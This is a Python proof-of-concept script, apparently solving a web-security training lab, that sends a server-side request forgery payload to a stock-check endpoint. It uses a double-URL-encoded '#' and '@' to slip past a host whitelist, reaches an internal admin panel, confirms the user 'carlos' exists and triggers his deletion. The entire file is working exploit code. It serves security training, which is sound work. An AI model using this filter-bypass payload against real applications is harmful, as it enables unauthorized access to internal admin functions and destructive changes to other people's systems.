import requests
import sys
from bs4 import BeautifulSoup


def check_url(raw_url):
    return raw_url.rstrip('/')

def del_carlos(base_url):

    check_user_exist(base_url)

    payload = {
        'stockApi': 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos',
        'storeId': 1
    }

    check_stock_url = base_url + '/product/stock'

    response2 = requests.post(check_stock_url, data = payload, allow_redirects = False)

    if response2.status_code == 302 and "/admin" in response2.headers["Location"]:
        print("User carlos delete successfully.")
    else:
        print("User carlos delete failed.")
        print(response2.status_code)


def check_user_exist(base_url):
    
    check_stock_url = base_url + '/product/stock'

    data = {
        # Because python3 requests will auto url encoded , so we want to do double url-encoded, we can place one url-encoded string here.
        'stockApi': 'http://localhost%23@stock.weliketoshop.net/admin',
        'storeId': 1
    }

    response = requests.post(check_stock_url, data = data)

    soup = BeautifulSoup(response.text, "html.parser")
    links = soup.find_all('a', href = "/admin/delete?username=carlos")

    if links:
        print("User carlos exist.")
        return 1
    else:
        print("User carlos not exist.")
        sys.exit(1)



if __name__ == "__main__":
    args = sys.argv[1:]
    if len(args) < 1:
        print("Usage: python poc.py <url>")
        sys.exit(1)

    base_url = check_url(args[0])
    del_carlos(base_url)
